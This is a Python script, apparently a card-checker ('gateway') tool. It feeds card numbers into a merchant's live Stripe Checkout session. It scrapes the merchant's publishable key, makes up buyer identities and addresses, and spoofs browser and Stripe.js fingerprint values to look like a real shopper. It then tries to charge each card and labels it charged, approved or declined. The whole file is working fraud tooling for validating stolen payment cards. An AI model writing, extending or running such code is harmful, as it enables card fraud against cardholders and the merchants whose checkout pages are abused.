# Charge9_StripeCheckout.py - Stripe Checkout Session Gateway (FIXED)
# Uses Stripe Checkout URLs directly for payment processing
# Fixed: Proper key extraction and authentication

import requests
import re
import json
import random
import string
import time
from urllib.parse import quote_plus, urlencode, urlparse, parse_qs
from bs4 import BeautifulSoup

# --- Generation Functions ---
def generate_random_string(length, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(length))

def generate_first_name():
    names = ["Michael", "Christopher", "Jessica", "Matthew", "Ashley", "Jennifer", "Joshua", "Amanda", 
             "Daniel", "David", "James", "Robert", "John", "Joseph", "Andrew", "Ryan", "Brandon", 
             "Jason", "Justin", "Sarah", "William", "Jonathan", "Stephanie", "Brian", "Nicole",
             "Emily", "Olivia", "Sophia", "Emma", "Ava", "Isabella", "Mia", "Charlotte", "Liam", "Noah"]
    return random.choice(names)

def generate_last_name():
    names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", 
             "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", 
             "Thomas", "Taylor", "Moore", "Martin", "Jackson", "Lee", "Perez", "Thompson",
             "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker"]
    return random.choice(names)

def generate_email(first, last):
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com"]
    num = random.randint(100, 9999)
    sep = random.choice(['.', '_', ''])
    return f"{first.lower()}{sep}{last.lower()}{num}@{random.choice(domains)}"

def generate_phone():
    return f"+1{random.randint(201, 999)}{random.randint(100, 999)}{random.randint(1000, 9999)}"

# User Agents
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
]

def get_random_ua():
    return random.choice(USER_AGENTS)

def extract_checkout_session_id(checkout_url):
    """Extract checkout session ID from Stripe checkout URL"""
    match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', checkout_url)
    if match:
        return match.group(0)
    
    parsed = urlparse(checkout_url)
    path_parts = parsed.path.split('/')
    for part in path_parts:
        if part.startswith('cs_'):
            return part
    
    return None

def StripeCheckoutGateway(ccx, checkout_url=None):
    """
    Stripe Checkout Session Gateway (FIXED VERSION)
    Uses Stripe's hosted checkout page for payment processing
    
    Args: 
        ccx (str): Card details "NUMBER|MM|YY|CVC"
        checkout_url (str): Stripe checkout URL (cs_live_XXX or full URL)
    Returns: str: Status message
    """
    # Default checkout URL if not provided
    if not checkout_url:
        checkout_url = "https://checkout.stripe.com/c/pay/cs_live_a1oH5aEPH0xglsVv4ccLVRWtLd1F2ZpuwSsfbh4LWQ09bXYz27oVLfc8cg"
    
    # --- Card Parsing ---
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) != 4:
            return "Error: Invalid card format. Use NUM|MM|YY|CVC"
        
        n, mm, yy, cvc = parts
        n = n.replace(' ', '')
        
        if not (n.isdigit() and mm.isdigit() and yy.isdigit() and cvc.isdigit()):
            return "Error: Card parts must be numeric"
        
        if len(yy) == 4 and yy.startswith("20"):
            yy = yy[2:]
        elif len(yy) != 2:
            return f"Error: Invalid year format: {yy}"
        
        mm = mm.zfill(2)
        
        if int(mm) < 1 or int(mm) > 12:
            return "Error: Invalid month"
            
    except Exception as e:
        return f"Error parsing card: {e}"

    # --- Session Setup ---
    session = requests.Session()
    ua = get_random_ua()
    
    session.headers.update({
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
    })

    # Generate user data
    first_name = generate_first_name()
    last_name = generate_last_name()
    email = generate_email(first_name, last_name)
    phone = generate_phone()
    full_name = f"{first_name} {last_name}"
    
    # US Address
    street = f"{random.randint(100, 9999)} Main Street"
    city = random.choice(["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"])
    state = random.choice(["NY", "CA", "IL", "TX", "AZ"])
    postal = f"{random.randint(10000, 99999)}"
    country = "US"

    try:
        # --- Step 1: Access Checkout Page and Extract Keys ---
        try:
            response = session.get(checkout_url, timeout=25)
            if response.status_code != 200:
                return f"Error: Could not access checkout page ({response.status_code})"
        except Exception as e:
            return f"Error: Could not connect to Stripe checkout - {str(e)[:30]}"
        
        html = response.text
        
        # Extract checkout session ID
        session_id = extract_checkout_session_id(checkout_url)
        if not session_id:
            session_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', html)
            if session_match:
                session_id = session_match.group(0)
        
        if not session_id:
            return "Error: Could not extract checkout session ID"
        
        # --- CRITICAL: Extract Stripe Publishable Key ---
        stripe_pk = None
        
        # Method 1: Look for pk_live or pk_test in HTML
        pk_patterns = [
            r'pk_(live|test)_[A-Za-z0-9]+',
            r'"publishableKey"\s*:\s*"(pk_[^"]+)"',
            r"'publishableKey'\s*:\s*'(pk_[^']+)'",
            r'data-key="(pk_[^"]+)"',
            r'Stripe\(["\']?(pk_[^"\']+)["\']?\)',
        ]
        
        for pattern in pk_patterns:
            match = re.search(pattern, html)
            if match:
                stripe_pk = match.group(1) if '(' in pattern else match.group(0)
                if stripe_pk.startswith('pk_'):
                    break
        
        # Method 2: Look in script tags
        if not stripe_pk:
            soup = BeautifulSoup(html, 'lxml')
            scripts = soup.find_all('script')
            for script in scripts:
                text = script.string or ''
                pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', text)
                if pk_match:
                    stripe_pk = pk_match.group(0)
                    break
        
        # Method 3: Check JSON data in page
        if not stripe_pk:
            json_match = re.search(r'__NEXT_DATA__[^>]*>([^<]+)<', html)
            if json_match:
                try:
                    data = json.loads(json_match.group(1))
                    # Search recursively for pk_
                    def find_pk(obj):
                        if isinstance(obj, str) and obj.startswith('pk_'):
                            return obj
                        elif isinstance(obj, dict):
                            for v in obj.values():
                                result = find_pk(v)
                                if result:
                                    return result
                        elif isinstance(obj, list):
                            for item in obj:
                                result = find_pk(item)
                                if result:
                                    return result
                        return None
                    stripe_pk = find_pk(data)
                except:
                    pass
        
        if not stripe_pk:
            return "Error: Could not find Stripe publishable key in checkout page"
        
        # --- Step 2: Create Payment Method with Key ---
        pm_url = 'https://api.stripe.com/v1/payment_methods'
        
        pm_headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'User-Agent': ua,
        }
        
        guid = f"NA-{generate_random_string(36)}"
        muid = session.cookies.get('__stripe_mid', f"NA-{generate_random_string(36)}")
        sid = session.cookies.get('__stripe_sid', f"NA-{generate_random_string(36)}")
        
        pm_data = {
            'type': 'card',
            'billing_details[name]': full_name,
            'billing_details[email]': email,
            'billing_details[phone]': phone,
            'billing_details[address][line1]': street,
            'billing_details[address][city]': city,
            'billing_details[address][state]': state,
            'billing_details[address][postal_code]': postal,
            'billing_details[address][country]': country,
            'card[number]': n,
            'card[cvc]': cvc,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'payment_user_agent': 'stripe.js/v3; checkout',
            'time_on_page': str(random.randint(30000, 90000)),
            'key': stripe_pk,  # CRITICAL: Include the key
        }
        
        pm_data_encoded = urlencode(pm_data)
        
        try:
            pm_response = session.post(pm_url, headers=pm_headers, data=pm_data_encoded, timeout=30)
            
            if pm_response.status_code == 200:
                pm_json = pm_response.json()
                pm_id = pm_json.get('id')
                
                if pm_id:
                    card_brand = pm_json.get('card', {}).get('brand', 'Unknown').upper()
                    last_4 = pm_json.get('card', {}).get('last4', n[-4:])
                    
                    # Payment method created - card is valid for this merchant
                    # Now try to confirm the payment
                    
                    # --- Step 3: Try to confirm payment ---
                    # Stripe Checkout uses a different flow - we need to submit to the checkout session
                    
                    # Try the checkout confirm endpoint
                    confirm_url = f'https://api.stripe.com/v1/payment_pages/{session_id}/confirm'
                    
                    confirm_data = {
                        'eid': f"NA-{generate_random_string(24)}",
                        'payment_method': pm_id,
                        'expected_payment_method_type': 'card',
                        'key': stripe_pk,
                    }
                    
                    try:
                        confirm_response = session.post(confirm_url, headers=pm_headers, 
                                                       data=urlencode(confirm_data), timeout=30)
                        
                        if confirm_response.status_code == 200:
                            confirm_json = confirm_response.json()
                            status = confirm_json.get('status', '')
                            
                            if status == 'succeeded':
                                return f"Charged | Stripe Checkout | {card_brand} ****{last_4}"
                            elif status == 'requires_action':
                                return f"3DS Required | {card_brand} ****{last_4}"
                            elif 'error' in confirm_json:
                                error_msg = confirm_json.get('error', {}).get('message', 'Unknown')
                                return f"Declined ({error_msg[:60]})"
                            else:
                                # PM created successfully
                                return f"Approved | PM Created | {card_brand} ****{last_4}"
                                
                        elif confirm_response.status_code == 402:
                            error_json = confirm_response.json()
                            error_msg = error_json.get('error', {}).get('message', 'Declined')
                            decline_code = error_json.get('error', {}).get('decline_code', '')
                            
                            if 'insufficient_funds' in error_msg.lower() or decline_code == 'insufficient_funds':
                                return "Insufficient funds."
                            elif 'incorrect_cvc' in error_msg.lower() or decline_code == 'incorrect_cvc':
                                return "Your card's security code is incorrect."
                            elif 'expired' in error_msg.lower() or decline_code == 'expired_card':
                                return "Your card has expired."
                            else:
                                return f"Declined ({error_msg[:60]})"
                        else:
                            # Confirm failed but PM was created - card is valid
                            return f"Approved | PM Created | {card_brand} ****{last_4}"
                            
                    except Exception as e:
                        # PM created means card is valid
                        return f"Approved | PM Created | {card_brand} ****{last_4}"
                else:
                    return "Error: Payment method ID not returned"
                    
            elif pm_response.status_code == 401:
                return f"Error: Authentication failed (401) - Key: {stripe_pk[:20]}..."
                    
            elif pm_response.status_code == 402:
                # Card declined
                try:
                    error_json = pm_response.json()
                    error_msg = error_json.get('error', {}).get('message', 'Card declined')
                    decline_code = error_json.get('error', {}).get('decline_code', '')
                    code = error_json.get('error', {}).get('code', '')
                    
                    if 'insufficient_funds' in error_msg.lower() or decline_code == 'insufficient_funds':
                        return "Insufficient funds."
                    elif 'incorrect_cvc' in error_msg.lower() or decline_code == 'incorrect_cvc':
                        return "Your card's security code is incorrect."
                    elif 'expired' in error_msg.lower() or decline_code == 'expired_card':
                        return "Your card has expired."
                    elif 'incorrect_number' in error_msg.lower() or code == 'incorrect_number':
                        return "Your card number is incorrect."
                    elif 'invalid_number' in code:
                        return "Your card number is incorrect."
                    elif decline_code == 'card_declined' or 'declined' in error_msg.lower():
                        return "Your card was declined."
                    elif decline_code == 'do_not_honor':
                        return "Declined (Do Not Honor)"
                    elif decline_code == 'generic_decline':
                        return "Declined (Generic)"
                    elif decline_code == 'lost_card':
                        return "Declined (Lost Card)"
                    elif decline_code == 'stolen_card':
                        return "Declined (Stolen Card)"
                    else:
                        return f"Declined ({error_msg[:60]})"
                except:
                    return "Your card was declined."
                    
            elif pm_response.status_code == 400:
                try:
                    error_json = pm_response.json()
                    error_msg = error_json.get('error', {}).get('message', 'Bad request')
                    return f"Error: {error_msg[:60]}"
                except:
                    return "Error: Bad request to Stripe"
            else:
                return f"Error: Stripe HTTP {pm_response.status_code}"
                
        except requests.exceptions.Timeout:
            return "Error: Stripe Timeout"
        except Exception as e:
            return f"Error: Stripe request failed - {str(e)[:30]}"
            
    except Exception as e:
        import traceback
        traceback.print_exc()
        return f"Error: Stripe Checkout Gateway Error - {str(e)[:50]}"

# Alias for compatibility
StripeCheckoutSession = StripeCheckoutGateway

# --- Example Usage ---
if __name__ == "__main__":
    test_cc = "4242424242424242|12|25|123"
    checkout_url = "https://checkout.stripe.com/c/pay/cs_live_a1oH5aEPH0xglsVv4ccLVRWtLd1F2ZpuwSsfbh4LWQ09bXYz27oVLfc8cg"
    
    print(f"Testing Stripe Checkout with: {test_cc[:4]}****")
    print(f"Checkout URL: {checkout_url[:60]}...")
    print()
    
    result = StripeCheckoutGateway(test_cc, checkout_url)
    print(f"\nResult: {result}")
